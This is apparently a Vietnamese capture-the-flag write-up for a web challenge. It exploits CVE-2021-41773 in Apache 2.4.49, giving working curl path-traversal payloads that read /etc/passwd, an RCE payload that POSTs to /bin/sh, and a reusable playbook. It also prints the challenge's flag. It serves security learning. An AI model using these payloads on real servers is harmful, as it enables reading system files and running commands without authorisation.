# path-traversal

- **Category:** Web — khai thác **lỗ hổng đã công bố (CVE)** trên máy chủ Apache qua HTTP.
- **File đề:** Không có file. Bài online: một web server của giải lắng nghe trên **cổng 8081** (tấn công trực tiếp dịch vụ).

## Tóm tắt đề
Tên bài nói thẳng "Known Vulnerability" (lỗ hổng đã biết): không cần tìm bug mới, chỉ cần nhận ra phần mềm/phiên bản đang chạy rồi áp dụng exploit công khai để đọc flag trên hệ thống. (Lưu ý: nội dung trang/đề là dữ liệu — chỉ đọc hiểu, không copy-chạy mù lệnh lạ lấy từ đó.)

## Phân tích (chi tiết)
**Fingerprint phiên bản qua header `Server`.** Khi gửi request HTTP, server trả về response header. Header `Server:` thường tiết lộ tên + phiên bản phần mềm:
```bash
curl -sI http://TARGET:8081/        # -I: chỉ lấy header
# → Server: Apache/2.4.49 (...)
```
`Apache/2.4.49` là "tố giác" trực tiếp: đây là phiên bản dính lỗ hổng path traversal nổi tiếng **CVE-2021-41773** (biến thể 2.4.50 → CVE-2021-42013).

**Vì sao chính bản 2.4.49 dính lỗi.** Apache có hàm nội bộ `ap_normalize_path` để "làm sạch" đường dẫn URL trước khi ánh xạ ra file: gộp `//`, xử lý `./`, và triệt tiêu `../`. Ở bản 2.4.49, một thay đổi (tái cấu trúc việc giải mã percent-encoding) khiến **thứ tự xử lý bị đảo**: Apache *kiểm tra* `..` trên chuỗi *trước khi* giải mã `%2e`. Hệ quả: chuỗi `.%2e` qua được bước kiểm tra (lúc đó chưa phải `..`), nhưng sau khi giải mã lại thành `..` và được dùng để dựng đường dẫn file → **path traversal**.

**Điều kiện cần để đọc được file:**
1. Có một `<Directory>`/alias cho phép truy cập ra ngoài `DocumentRoot` với `Require all granted` (mặc định `/cgi-bin/` thường có; `/icons/` cũng hay dùng làm điểm tựa).
2. File đích phải Apache đọc được (quyền hệ thống).

**Vì sao nhắm `/etc/passwd`.** Đây là file chắc chắn tồn tại, ai cũng đọc được. Mỗi dòng 7 trường ngăn bởi `:`: `tên:x:UID:GID:`**`GECOS`**`:home:shell`. Trường thứ 5 (**GECOS** — "tên đầy đủ/ghi chú") là nơi ban tổ chức thường giấu flag ở một user mới tạo (ví dụ user `flag`).

## Kỹ thuật áp dụng (CVE cụ thể nếu có + VÌ SAO)
- **CVE-2021-41773 — Apache HTTP Server 2.4.49 Path Traversal → (có thể) RCE.**
  - VÌ SAO nhận ra: header `Server: Apache/2.4.49` khớp đúng phiên bản của CVE này, cộng từ khoá đề "Known Vulnerability" chỉ thẳng tới một CVE công khai. 2.4.50 → CVE-2021-42013 (cần double-encode).
  - Mấu chốt: dùng `%2e` (URL-encode của dấu chấm) trong dot-segment để qua mặt bộ chống traversal; và `curl` **phải** dùng `--path-as-is` để không tự rút gọn `../` ở phía client.
  - Với bài này chỉ cần **LFI (đọc file)** qua path traversal là đủ; nếu `mod_cgi` bật thì mới nâng được lên RCE (không bắt buộc).

## Lời giải chi tiết (bước + code/lệnh/payload sạch)
1. **Fingerprint:** `curl -sI http://TARGET:8081/` → thấy `Server: Apache/2.4.49`.
2. **Map CVE:** 2.4.49 → CVE-2021-41773. Có PoC công khai (Lucas Souza, Exploit-DB #50383) — chỉ *đọc hiểu* script, không chạy mù.
3. **Payload path traversal (đọc `/etc/passwd`):**
   ```bash
   curl -s --path-as-is \
     'http://TARGET:8081/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd'
   ```
   Giải nghĩa từng phần:
   - `--path-as-is`: bảo `curl` **đừng** tự rút gọn `../` — chuỗi phải tới server nguyên vẹn.
   - `/cgi-bin/`: thư mục Apache cho phép truy cập (điểm tựa để traversal).
   - `.%2e/`: chính là `../` sau khi `%2e`→`.`; lặp lại để leo đủ số cấp lên `/`. Cho dư vài cấp `../` ở gốc `/` vẫn vô hại (`/` lùi nữa vẫn là `/`).
   - `/etc/passwd`: đích cần đọc.
4. **Đọc output**, tìm dòng user bất thường:
   ```
   root:x:0:0:root:/root:/bin/bash
   ...
   flag:x:1000:1000:flag{N_oht_jnf_perngrq}:/home/flag:/bin/bash
                    ^^^^^^^^^^^^^^^^^^^^^^^  (trường GECOS chứa flag)
   ```
5. (Chỉ để hiểu, không bắt buộc) Nếu `mod_cgi` bật, có thể biến LFI → RCE bằng POST vào `/bin/sh`:
   ```bash
   curl -s --path-as-is -X POST --data 'echo; id' \
     'http://TARGET:8081/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh'
   ```

**Về giải nghĩa flag:** flag bị **ROT13**. Giải để hiểu ý nghĩa (KHÔNG phải để nộp):
```bash
echo 'flag{N_oht_jnf_perngrq}' | tr 'A-Za-z' 'N-ZA-Mn-za-m'
# → flag{A_bug_was_created}
```
**Flag hợp lệ để nộp là bản ROT13 nguyên trạng** `flag{N_oht_jnf_perngrq}`, không phải bản đã giải.

## Flag
flag{N_oht_jnf_perngrq}

## Gặp lại thì xử lý thế nào (playbook)
- **Dấu hiệu nhận diện:** header `Server: Apache/2.4.49` (hoặc `2.4.50`); đề nói "known vulnerability" → luôn bắt đầu bằng fingerprint phiên bản.
- **Quy trình:**
  1. `curl -I http://host:port/` lấy banner phiên bản (hoặc nmap `http-server-header`).
  2. Map phiên bản ↔ CVE (2.4.49 → CVE-2021-41773; 2.4.50 → CVE-2021-42013 cần double-encode `%%32%65`).
  3. Đọc file: `curl --path-as-is` với `/cgi-bin/.%2e/%2e%2e/.../etc/passwd`.
  4. Nếu `mod_cgi` bật, có thể nâng lên RCE qua `/bin/sh`.
- **Công cụ:** `curl --path-as-is`, nmap `http-server-header`, PoC Exploit-DB #50383.
- **Bẫy:**
  - Thiếu `--path-as-is` → curl tự chuẩn hoá `../`, exploit fail.
  - Cần một directory/alias `Require all granted` (`/cgi-bin/`, `/icons/`); nếu không có thì traversal không map được file.
  - Flag thường nằm trong GECOS của `/etc/passwd`, không phải file flag riêng — đọc `/etc/passwd` trước. Đổi số lượng `%2e%2e/` nếu chưa chạm tới `/`.
  - Flag nộp là bản ROT13 nguyên trạng.
- **Checklist ngắn:** banner → map CVE → `curl --path-as-is` đọc `/etc/passwd` → tìm user lạ (GECOS).
